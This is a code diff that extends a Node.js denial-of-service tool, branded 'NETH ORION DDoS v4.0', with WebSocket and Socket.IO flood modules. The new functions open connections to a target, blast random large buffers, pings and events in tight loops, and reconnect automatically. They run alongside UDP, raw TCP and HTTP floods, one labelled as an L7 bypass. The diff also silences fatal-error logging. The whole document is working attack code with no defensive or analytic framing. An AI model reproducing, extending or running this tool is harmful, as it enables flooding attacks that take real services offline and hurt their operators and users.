@@ -13,6 +13,8 @@ const readline = require("readline");
 require("dotenv").config();
 
 const nport = require("./nport.js");
+const WebSocket = require('ws');
+const { io } = require('socket.io-client');
 
 
 const REQUESTS_PER_CYCLE = parseInt(process.env.PER_THREAD, 10) || 3;
@@ -24,6 +26,8 @@ const USE_RAW_TCP = process.env.RAW_TCP !== "false";
 const KEEP_ALIVE = process.env.KEEP_ALIVE !== "false";
 const L7_BYPASS = process.env.L7_BYPASS !== "false";
 const STOP_KEY = process.env.STOP_KEY || '';
+const USE_WS = process.env.WS_FLOOD !== "false";
+const USE_SOCKETIO = process.env.SOCKETIO_FLOOD !== "false";
 
 
 
@@ -35,7 +39,7 @@ function handleShutdown() {
 process.on('uncaughtException', (err) => {
   try {
     handleShutdown();
-    console.error(colors.red(`[FATAL] Uncaught Exception: ${err.message}`));
+  //  console.error(colors.red(`[FATAL] Uncaught Exception: ${err.message}`));
   } catch {}
 });
 
@@ -43,7 +47,7 @@ process.on('unhandledRejection', (reason) => {
   if (!reason || reason.code === 'UND_ERR_ABORTED' || reason.code === 'ECONNRESET' || reason.code === 'ETIMEDOUT') return;
   try {
     handleShutdown();
-    console.error(colors.red(`[FATAL] Unhandled Rejection: ${reason?.message || reason}`));
+  //  console.error(colors.red(`[FATAL] Unhandled Rejection: ${reason?.message || reason}`));
   } catch {}
 });
 
@@ -223,6 +227,8 @@ function getJitter() {
 
 
 const udpSockets = new Set();
+const wsSockets = new Set();
+const socketIOClients = new Set();
 
 function udpFlood(targetIP, port, threadId) {
   const socket = dgram.createSocket("udp4");
@@ -258,6 +264,20 @@ function closeAllUdpSockets() {
   udpSockets.clear();
 }
 
+function closeAllWsSockets() {
+  for (const ws of wsSockets) {
+    try { ws.close(); } catch {}
+  }
+  wsSockets.clear();
+}
+
+function closeAllSocketIOClients() {
+  for (const socket of socketIOClients) {
+    try { socket.disconnect(); } catch {}
+  }
+  socketIOClients.clear();
+}
+
 function rawTCPFlood(host, port, threadId) {
   let sent = 0;
   const flood = () => {
@@ -275,6 +295,91 @@ function rawTCPFlood(host, port, threadId) {
   };
   setImmediate(flood);
   return () => sent;
+}
+
+function wsFlood(host, port, threadId) {
+  let ws = null;
+  let reconnectTimer = null;
+  const connect = () => {
+    if (!continueAttack) return;
+    try {
+      const protocol = port === 443 ? 'wss' : 'ws';
+      ws = new WebSocket(`${protocol}://${host}:${port}`);
+      wsSockets.add(ws);
+      ws.on('open', () => {
+        const sendFlood = () => {
+          if (!continueAttack || ws.readyState !== WebSocket.OPEN) return;
+          const size = Math.floor(Math.random() * 64000) + 1000;
+          const buf = Buffer.alloc(size, Math.floor(Math.random() * 256));
+          try { ws.send(buf); } catch {}
+          try { ws.ping(); } catch {}
+          setTimeout(sendFlood, Math.floor(Math.random() * 150) + 20);
+        };
+        sendFlood();
+      });
+      ws.on('close', () => {
+        wsSockets.delete(ws);
+        if (continueAttack) {
+          reconnectTimer = setTimeout(connect, Math.floor(Math.random() * 2000) + 1000);
+        }
+      });
+      ws.on('error', () => {});
+    } catch (err) {
+      if (continueAttack) {
+        reconnectTimer = setTimeout(connect, Math.floor(Math.random() * 2000) + 1000);
+      }
+    }
+  };
+  connect();
+  return () => {
+    if (reconnectTimer) clearTimeout(reconnectTimer);
+    if (ws) { try { ws.close(); } catch {}; wsSockets.delete(ws); }
+  };
+}
+
+function socketIOFlood(url, threadId) {
+  let socket = null;
+  let reconnectTimer = null;
+  const connect = () => {
+    if (!continueAttack) return;
+    try {
+      socket = io(url, {
+        transports: ['polling', 'websocket'],
+        forceNew: true,
+        reconnection: false,
+        timeout: 10000,
+      });
+      socketIOClients.add(socket);
+      socket.on('connect', () => {
+        const eventFlood = () => {
+          if (!continueAttack || !socket.connected) return;
+          const events = ['message', 'data', 'ping', 'heartbeat', 'event', 'update', 'broadcast'];
+          const event = events[Math.floor(Math.random() * events.length)];
+          const payload = Math.random().toString(36).repeat(Math.floor(Math.random() * 100) + 10);
+          try { socket.emit(event, payload); } catch {}
+          try { socket.emit(event, { data: payload, ts: Date.now() }); } catch {}
+          setTimeout(eventFlood, Math.floor(Math.random() * 100) + 20);
+        };
+        eventFlood();
+      });
+      socket.on('disconnect', () => {
+        socketIOClients.delete(socket);
+        if (continueAttack) {
+          reconnectTimer = setTimeout(connect, Math.floor(Math.random() * 2000) + 1000);
+        }
+      });
+      socket.on('connect_error', () => {});
+    } catch (err) {
+      if (continueAttack) {
+        reconnectTimer = setTimeout(connect, Math.floor(Math.random() * 2000) + 1000);
+      }
+    }
+  };
+  connect();
+  return () => {
+    if (reconnectTimer) clearTimeout(reconnectTimer);
+    if (socket) { try { socket.disconnect(); } catch {}; socketIOClients.delete(socket); }
+  };
 }
 
 function socksRequest(url, agent, threadId) {
@@ -709,7 +814,9 @@ const startAttack = async (url, durationHours) => {
   if (USE_RAW_TCP) console.log(colors.red("RAW TCP: ON"));
   if (KEEP_ALIVE) console.log(colors.cyan("Keep-Alive: ON"));
   if (L7_BYPASS) console.log(colors.magenta("L7 BYPASS: ON (browser TLS fingerprints + Sec-* headers + cookie persistence + jitter)"));
-  console.log(colors.green("ALL ATTACK LAYERS RUNNING CONCURRENTLY (L4 UDP + L4 TCP + L7 HTTP)"));
+  if (USE_WS) console.log(colors.red("WEBSOCKET FLOOD: ON"));
+  if (USE_SOCKETIO) console.log(colors.red("SOCKET.IO FLOOD: ON"));
+  console.log(colors.green("ALL ATTACK LAYERS RUNNING CONCURRENTLY (L4 UDP + L4 TCP + L7 HTTP + WebSocket + Socket.IO)"));
   if (tunnelActive && nportUrl) console.log(colors.magenta(`Public: ${nportUrl}`));
   console.log("");    activeThreads = [];
   threadTypes.clear();
@@ -799,6 +906,13 @@ const performAttackSingle = async (target, ctx, threadId) => {
     if (USE_RAW_TCP) {
       const parsed = new URL(target.url);
       rawTCPFlood(parsed.hostname, parsed.port || 80, threadId);
+    }
+    if (USE_WS) {
+      const parsed = new URL(target.url);
+      wsFlood(parsed.hostname, parsed.port || (parsed.protocol === 'https:' ? 443 : 80), threadId);
+    }
+    if (USE_SOCKETIO) {
+      socketIOFlood(target.url, threadId);
     }
     
     const startTime = Date.now();
@@ -909,6 +1023,8 @@ const stopAttack = async () => {
   continueAttack = false;
   stopWatchdog();
   closeAllUdpSockets();
+  closeAllWsSockets();
+  closeAllSocketIOClients();
   stopStatusDisplay();
   activeThreads = [];
   threadTypes.clear();
@@ -942,7 +1058,9 @@ const resumeAttack = async () => {
   if (USE_RAW_TCP) console.log(colors.red("RAW TCP: ON"));
   if (KEEP_ALIVE) console.log(colors.cyan("Keep-Alive: ON"));
   if (L7_BYPASS) console.log(colors.magenta("L7 BYPASS: ON (browser TLS fingerprints + Sec-* headers + cookie persistence + jitter)"));
-  console.log(colors.green("ALL ATTACK LAYERS RUNNING CONCURRENTLY (L4 UDP + L4 TCP + L7 HTTP)"));
+  if (USE_WS) console.log(colors.red("WEBSOCKET FLOOD: ON"));
+  if (USE_SOCKETIO) console.log(colors.red("SOCKET.IO FLOOD: ON"));
+  console.log(colors.green("ALL ATTACK LAYERS RUNNING CONCURRENTLY (L4 UDP + L4 TCP + L7 HTTP + WebSocket + Socket.IO)"));
   if (tunnelActive && nportUrl) console.log(colors.magenta(`Public: ${nportUrl}`));
   console.log(colors.cyan(`Queue length: ${targetQueue.length}/${MAX_QUEUE}`));
   console.log("");
@@ -1018,7 +1136,7 @@ const showHelp = () => {
   console.log(`${colors.green("help")}                       - This help`);
   console.log(`${colors.green("exit")}                       - Exit\n`);
   console.log(colors.gray(`Threads: ${numThreads} | Cycle: ${REQUESTS_PER_CYCLE}`));
-  console.log(colors.gray(`UDP: ${USE_UDP} | Raw TCP: ${USE_RAW_TCP} | L7 Bypass: ${L7_BYPASS} | Keep-Alive: ${KEEP_ALIVE}`));
+  console.log(colors.gray(`UDP: ${USE_UDP} | Raw TCP: ${USE_RAW_TCP} | L7: ${L7_BYPASS} | WS: ${USE_WS} | SocketIO: ${USE_SOCKETIO} | Keep-Alive: ${KEEP_ALIVE}`));
   console.log(colors.gray(`State persistence: atomic (temp file + rename)`));
 };
 
@@ -1037,7 +1155,7 @@ const showQueue = () => {
 const clearConsole = () => {
   console.clear();
   console.log(colors.green("NETH ORION DDoS v4.0"));
-  console.log(colors.gray(`Keep-Alive: ${KEEP_ALIVE} | UDP: ${USE_UDP} | RAW: ${USE_RAW_TCP} | L7: ${L7_BYPASS}`));
+  console.log(colors.gray(`Keep-Alive: ${KEEP_ALIVE} | UDP: ${USE_UDP} | RAW: ${USE_RAW_TCP} | L7: ${L7_BYPASS} | WS: ${USE_WS} | SocketIO: ${USE_SOCKETIO}`));
   console.log(colors.gray('Type "help" for commands\n'));
 };
 
@@ -1124,7 +1242,7 @@ const port = process.env.PORT || 25694;
     console.log(colors.green(`\nNETH ORION DDoS v4.0`));
     console.log(colors.cyan(`Local API: http:\/\/localhost:${port}`));
     console.log(colors.magenta(`Threads: ${numThreads} | Keep-Alive: ${KEEP_ALIVE}`));
-    console.log(colors.red(`UDP: ${USE_UDP} | Raw TCP: ${USE_RAW_TCP} | L7: ${L7_BYPASS}`));
+    console.log(colors.red(`UDP: ${USE_UDP} | Raw TCP: ${USE_RAW_TCP} | L7: ${L7_BYPASS} | WS: ${USE_WS} | SocketIO: ${USE_SOCKETIO}`));
     if (tunnelActive && nportUrl) console.log(colors.magenta(`Public API: ${nportUrl}`));
     console.log(colors.green('\nType "help" for commands\n'));
 
